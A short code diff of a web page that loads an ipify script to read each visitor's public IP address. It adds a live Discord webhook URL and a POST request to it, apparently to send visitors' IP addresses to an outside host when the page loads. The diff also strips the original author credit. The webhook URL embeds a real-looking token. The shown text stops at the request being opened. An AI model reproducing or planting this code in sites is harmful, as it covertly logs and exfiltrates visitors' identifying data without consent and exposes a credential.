@@ -50,10 +50,9 @@
      
 <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP">
     function getIP(json) {
-        // Script By BY JUB0T //
         console.log("My public IP address is: ", json.ip);
         var request = new XMLHttpRequest();
-        const Hook = "URL-HERE";
+        const Hook = "https://discordapp.com/api/webhooks/953945431719706644/5AzEkz2uc3nzg9zyFsHI9DKiHB9X1AP7x2f54kGpWPQtaVNqMsftA2CJnSSMDpXDHkh8";
 
         var request = new XMLHttpRequest();
         request.open("POST", Hook);
